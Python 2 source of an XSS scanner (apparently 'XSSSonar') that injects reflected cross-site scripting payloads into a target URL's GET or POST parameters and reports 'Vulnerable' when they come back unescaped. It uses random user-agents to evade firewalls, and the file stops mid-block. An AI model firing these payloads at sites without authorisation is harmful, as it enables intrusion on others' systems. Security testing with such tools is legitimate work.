#!/usr/bin/python
# -*- coding: utf-8 -*-

# Test with Python 2.7.9 on Debian Jessie. I'll write it for Python 3.x maybe.
# Little tool to look for XSS vulnerabilities in a web page.
# pip install fake-useragent

import urllib2
import urllib
import httplib
import re
import os
import os.path
import socket
import ssl
import sys
import signal
import time
from fake_useragent import UserAgent


print '\x1b[1;34;49m' + ' __   __ _____ _____ _____                        ' + '\x1b[0m'
print '\x1b[1;34;49m' + ' \ \ / // ____/ ____/ ____|                       ' + '\x1b[0m'
print '\x1b[1;34;49m' + '  \ V /| (___| (___| (___   ___  _ __   __ _ _ __ ' + '\x1b[0m'
print '\x1b[1;34;49m' + '   > <  \___ \\\\___ \\\\___ \ / _ \| `_ \ / _` | `__|' + '\x1b[0m'
print '\x1b[1;34;49m' + '  / . \ ____) |___) |___) | (_) | | | | (_| | |   ' + '\x1b[0m'
print '\x1b[1;34;49m' + ' /_/ \_\_____/_____/_____/ \___/|_| |_|\__,_|_|   0.1.5' + '\x1b[0m'
print ''
print ''
print '\x1b[1;34;49m' + '            |_' + '\x1b[0m'
print '\x1b[1;34;49m' + '      _____|~ |____ ' + '\x1b[0m'
print '\x1b[1;34;49m' + '     (  --         ------_,' + '\x1b[0m'
print '\x1b[1;34;49m' + '      `-------------------\'`' + '\x1b[0m'
print ''
print '\x1b[1;39;49m' + '   Made with' + '\x1b[0m' + '\x1b[1;31;49m' + ' ❤' + '\x1b[0m' + '\x1b[1;39;49m' + ' - https://www.github.com/luigigubello' + '\x1b[0m'
print ''


# if you press CTRL+C stop the program
def sigint_handler(signum, frame):
	print '\x1b[1;31;49m' + '\nCtrl+C, exit, bye bye!' + '\x1b[0m'
	sys.exit()
signal.signal(signal.SIGINT, sigint_handler)
 

class MyException(Exception):
    pass

# random user-agent to bypass some firewall
ua = UserAgent()
header = {'User-Agent':str(ua.random)}

# function to break down URL
def url_return(site, list_parameters, i, z_url):

	if len(list_parameters) == 1 and i == 0:
		x = site.split('?' + list_parameters[0] + '=')
		url = str(x[0]) + '?' + list_parameters[0] + '=' + z_url
	elif len(list_parameters) != 1 and i == 0:
		x = site.split('&' + list_parameters[1] + '=')
		y = str(x[0])
		y = y.split('?' + list_parameters[0] + '=')
		url = str(y[0]) + '?' + list_parameters[0] + '=' + z_url + '&' + list_parameters[1] + '=' + str(x[1])
	elif i == (len(list_parameters)-1) and i != 0:
		x = site.split('&' + list_parameters[i] + '=')
		url = str(x[0]) + '&' + list_parameters[i] + '=' + z_url
	else:
		x = site.split('&' + list_parameters[i+1] + '=')
		y = str(x[0])
		y = y.split('&' + list_parameters[i] + '=')
		url = str(y[0]) + '&' + list_parameters[i] + '=' + z_url + '&' + list_parameters[i+1] + '=' + str(x[1])
	return url

# check GET or POST parameters in URL
def url_xss_finder(site, post):

	# look for GET parameters in URL if there isn't POST parameter
	if post == '':
		# define if URL is valid or not
		if re.findall('\?(.*)=', site) != []:
			list_parameters = re.search('\?(.*)=', site)
		else:
			print '\x1b[1;31;49m' + 'URL not valid.' + '\x1b[0m'
			return

		# create a list with GET parameters
		list_parameters = list_parameters.group()
		list_parameters = list_parameters.split('&')
		k = 0
		i = 0
		l = len(list_parameters)
		while k < l:
			if (i == 0):
				x = list_parameters[i].split('=')
				x = x[0].split('?')
				x = str(x[1])
				list_parameters[i] = x
				k += 1
				i += 1
			else:
				if ('=' in str(list_parameters[i])):
					x = list_parameters[i].split('=')				
					x = str(x[0])
					list_parameters[i] = x
					k += 1
					i += 1
				else:
					del list_parameters[i]
					k += 1
		print '\x1b[1;39;49m' + '\nThe parameters are: ' + '\x1b[0m' + '\x1b[1;33;49m',list_parameters,'\x1b[0m' + '\n'
	else:
		list_parameters = [post]

	# test XSS payloads on the list of parameters
	if list_parameters == []:
		print '\x1b[1;31;49m' + 'Parameters not found.' + '\x1b[0m'

	else:
	
		i = 0
		while (i < len(list_parameters)):

			j = 0
			e_count = 0
			print '\x1b[1;39;49m' + 'Analize parameter: ' + '\x1b[0m' + '\x1b[1;33;49m',list_parameters[i],'\x1b[0m'


			z_url = '%27%22%3E%22%27%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm`XSS`%3E'
			z_search = '\'">"\'><img src=x onerror=confirm`XSS`>'
			z_search_a = '\'">"\'><img src="x" onerror="confirm`XSS`">'
			z_search_b = '\'">"\'><img Src=x Onerror=confirm`XSS`>'
			z_search_c = '\'\'">"\'\'><img src=x onerror=confirm`XSS`>'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '\'">"\'><img src=x onerror=confirm`XSS`>'
			# Different requests for GET and POST parameters
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_a = re.findall(z_search_a, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				payload_search_c = re.findall(z_search_c, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				c = 0
				if payload_search_script_c != []:
					if post == '':
						z_url_script = '\'</script>' + z_url
						url_script = url_return(site, list_parameters, i, z_url_script)
					else:
						z_payload_script = '\'</script>' + z_payload
						payload_script = {post : z_payload_script}
						data_payload_script = urllib.urlencode(payload_script)
					err_script = ''
					try:
						if post == '':
    							request_script = urllib2.Request(url_script, headers = header)
						else:
							request_script = urllib2.Request(site, headers = header, data = data_payload_script)
						urllib2.urlopen(request_script, timeout = 3)
					except urllib2.URLError as e:
						err_script = "Page not loaded."
					except socket.timeout as e:
    						err_script = "Page not loaded."
					except socket.error as e:
    						err_script = "Page not loaded."
					except urllib2.HTTPError as e:
    						err_script = "Page not loaded."
					except ssl.SSLError as e:
						err_script = "Page not loaded."
					except httplib.BadStatusLine as e:
						err_script = "Page not loaded."
					if err_script == '':
						z_search_script_test = '\'</script>' + z_search
						html_content = urllib2.urlopen(request_script).read()
						payload_search_script_test = re.findall(z_search_script_test, html_content)
						if payload_search_script_test != []:
							c = 1
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0 and payload_search != [])):
					control = 1
				if (control == 1 or payload_search_a != [] or payload_search_b != [] or payload_search_c != []):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
				if c == 1:
					z_payload_script = '\'</script>' + z_payload
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload_script,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%3C%2Fscript%3E%22%3E%20%3Cscript%3Ealert`XSS`%3C%2Fscript%3E'
			z_search = '</script>"> <script>alert`XSS`</script>'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '</script>"> <script>alert`XSS`</script>'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or (len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0):
					control = 1
				if (payload_search != [] and control == 1):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%22%27%2C%3B%3C%2Fscript%3E%3Cscript%3Econfirm`XSS`%3C%2Fscript%3E'
			z_search = '"\',;</script><script>confirm`XSS`</script>'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '"\',;</script><script>confirm`XSS`</script>'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or (len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0):
					control = 1
				if (payload_search != [] and control == 1):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1


			z_url = '%27%22%3E%22%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E'
			z_search = '\'">"\'><svg onload=confirm`XSS`>'
			z_search_a = '\'">"\'><svg onload="confirm`XSS`>'
			z_search_b = '\'">"\'><svg Onload=confirm`XSS`>'
			z_search_c = '\'\'">"\'\'><svg onload=confirm`XSS`>'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '\'">"\'><svg onload=confirm`XSS`>'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_a = re.findall(z_search_a, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				payload_search_c = re.findall(z_search_c, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				c = 0
				if payload_search_script_c != []:
					if post == '':
						z_url_script = '\'</script>' + z_url
						url_script = url_return(site, list_parameters, i, z_url_script)
					else:
						z_payload_script = '\'</script>' + z_payload
						payload_script = {post : z_payload_script}
						data_payload_script = urllib.urlencode(payload_script)
					err_script = ''
					try:
						if post == '':
    							request_script = urllib2.Request(url_script, headers = header)
						else:
							request_script = urllib2.Request(site, headers = header, data = data_payload_script)
						urllib2.urlopen(request_script, timeout = 3)
					except urllib2.URLError as e:
						err_script = "Page not loaded."
					except socket.timeout as e:
    						err_script = "Page not loaded."
					except socket.error as e:
    						err_script = "Page not loaded."
					except urllib2.HTTPError as e:
    						err_script = "Page not loaded."
					except ssl.SSLError as e:
						err_script = "Page not loaded."
					except httplib.BadStatusLine as e:
						err_script = "Page not loaded."
					if err_script == '':
						z_search_script_test = '\'</script>' + z_search
						html_content = urllib2.urlopen(request_script).read()
						payload_search_script_test = re.findall(z_search_script_test, html_content)
						if payload_search_script_test != []:
							c = 1
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0 and payload_search != [])):
					control = 1
				if (control == 1 or payload_search_a != [] or payload_search_b != [] or payload_search_c != []):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
				if c == 1:
					z_payload_script = '\'</script>' + z_payload
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload_script,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%27%3E%3Csvg%20onload%3Dconfirm`XSS`%3E'
			z_search = '\'><svg onload=confirm`XSS`>'
			z_search_a = '\'><svg onload="confirm`XSS`">'
			z_search_b = '\'><svg Onload=confirm`XSS`>'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '\'><svg onload=confirm`XSS`>'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_a = re.findall(z_search_a, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				c = 0
				if payload_search_script_c != []:
					if post == '':
						z_url_script = '\'</script>' + z_url
						url_script = url_return(site, list_parameters, i, z_url_script)
					else:
						z_payload_script = '\'</script>' + z_payload
						payload_script = {post : z_payload_script}
						data_payload_script = urllib.urlencode(payload_script)
					err_script = ''
					try:
						if post == '':
    							request_script = urllib2.Request(url_script, headers = header)
						else:
							request_script = urllib2.Request(site, headers = header, data = data_payload_script)
						urllib2.urlopen(request_script, timeout = 3)
					except urllib2.URLError as e:
						err_script = "Page not loaded."
					except socket.timeout as e:
    						err_script = "Page not loaded."
					except socket.error as e:
    						err_script = "Page not loaded."
					except urllib2.HTTPError as e:
    						err_script = "Page not loaded."
					except ssl.SSLError as e:
						err_script = "Page not loaded."
					except httplib.BadStatusLine as e:
						err_script = "Page not loaded."
					if err_script == '':
						z_search_script_test = '\'</script>' + z_search
						html_content = urllib2.urlopen(request_script).read()
						payload_search_script_test = re.findall(z_search_script_test, html_content)
						if payload_search_script_test != []:
							c = 1
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0 and payload_search != [])):
					control = 1
				if (control == 1 or payload_search_a != [] or payload_search_b != []):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
				if c == 1:
					z_payload_script = '\'</script>' + z_payload
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload_script,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%22%3E%3Csvg/onload%3Dconfirm`XSS`//'
			z_search = '"><svg/onload=confirm`XSS`//'
			z_search_a = '"><svg/onload="confirm`XSS`"//'
			z_search_b = '"><svg/Onload=confirm`XSS`//'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '"><svg/onload=confirm`XSS`//'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_a = re.findall(z_search_a, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				c = 0
				if payload_search_script_c != []:
					if post == '':
						z_url_script = '\'</script>' + z_url
						url_script = url_return(site, list_parameters, i, z_url_script)
					else:
						z_payload_script = '\'</script>' + z_payload
						payload_script = {post : z_payload_script}
						data_payload_script = urllib.urlencode(payload_script)
					err_script = ''
					try:
						if post == '':
    							request_script = urllib2.Request(url_script, headers = header)
						else:
							request_script = urllib2.Request(site, headers = header, data = data_payload_script)
						urllib2.urlopen(request_script, timeout = 3)
					except urllib2.URLError as e:
						err_script = "Page not loaded."
					except socket.timeout as e:
    						err_script = "Page not loaded."
					except socket.error as e:
    						err_script = "Page not loaded."
					except urllib2.HTTPError as e:
    						err_script = "Page not loaded."
					except ssl.SSLError as e:
						err_script = "Page not loaded."
					except httplib.BadStatusLine as e:
						err_script = "Page not loaded."
					if err_script == '':
						z_search_script_test = '\'</script>' + z_search
						html_content = urllib2.urlopen(request_script).read()
						payload_search_script_test = re.findall(z_search_script_test, html_content)
						if payload_search_script_test != []:
							c = 1
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c)) == 0 and payload_search != [])):
					control = 1
				if (control == 1 or payload_search_a != [] or payload_search_b != []):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
				if c == 1:
					z_payload_script = '\'</script>' + z_payload
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload_script,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1


			z_url = '%22%3E%3Cdetails%2Fopen%2Fontoggle%3Dconfirm%60XSS%60%3E'
			z_search = '"><details/open/ontoggle=confirm`XSS`>'
			z_search_a = '"><details/open/ontoggle="confirm`XSS`">'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_payload = '"><details/open/ontoggle=confirm`XSS`>'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_a = re.findall(z_search_a, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				c = 0
				if payload_search_script_c != []:
					if post == '':
						z_url_script = '\'</script>' + z_url
						url_script = url_return(site, list_parameters, i, z_url_script)
					else:
						z_payload_script = '\'</script>' + z_payload
						payload_script = {post : z_payload_script}
						data_payload_script = urllib.urlencode(payload_script)
					err_script = ''
					try:
						if post == '':
    							request_script = urllib2.Request(url_script, headers = header)
						else:
							request_script = urllib2.Request(site, headers = header, data = data_payload_script)
						urllib2.urlopen(request_script, timeout = 3)
					except urllib2.URLError as e:
						err_script = "Page not loaded."
					except socket.timeout as e:
    						err_script = "Page not loaded."
					except socket.error as e:
    						err_script = "Page not loaded."
					except urllib2.HTTPError as e:
    						err_script = "Page not loaded."
					except ssl.SSLError as e:
						err_script = "Page not loaded."
					except httplib.BadStatusLine as e:
						err_script = "Page not loaded."
					if err_script == '':
						z_search_script_test = '\'</script>' + z_search
						html_content = urllib2.urlopen(request_script).read()
						payload_search_script_test = re.findall(z_search_script_test, html_content)
						if payload_search_script_test != []:
							c = 1
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a)+ len(payload_search_script_c)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_c)) == 0 and payload_search != [])):
					control = 1
				if (control == 1 or payload_search_a != []):
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
				if c == 1:
					z_payload_script = '\'</script>' + z_payload
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload_script,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1
		
			z_url = '%22%20onfocus%3D%22confirm`XSS`%22%20autofocus%3D%22%22'
			z_search = '" onfocus="confirm`XSS`" autofocus=""'
			z_search_b = '" Onfocus="confirm`XSS`" Autofocus=""'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_search_script_d = '>' + z_search + '<'
			z_payload = '" onfocus="confirm`XSS`" autofocus=""'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				z_control = re.findall('<html xmlns=', html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				payload_search_script_d = re.findall(z_search_script_d, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) == 0 and payload_search != [])):
					control = 1
				if (payload_search_b != [] or control == 1) and z_control == []:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1
				
		
			z_url = '%22%20onclick%3D%22confirm`XSS`%22'
			z_search = '" onclick="confirm`XSS`"'
			z_search_b = '" Onclick="confirm`XSS`"'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_search_script_d = '>' + z_search + '<'
			z_payload = '" onclick="confirm`XSS`"'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				z_control = re.findall('<html xmlns=', html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				payload_search_script_d = re.findall(z_search_script_d, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) == 0 and payload_search != [])):
					control = 1
				if (payload_search_b != [] or control == 1) and z_control == []:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

	
			z_url = '%22%20onmouseover%3D%22confirm`XSS`%22'
			z_search = '" onmouseover="confirm`XSS`"'
			z_search_b = '" Onmouseover="confirm`XSS`"'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_search_script_d = '>' + z_search + '<'
			z_payload = '" onmouseover="confirm`XSS`"'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
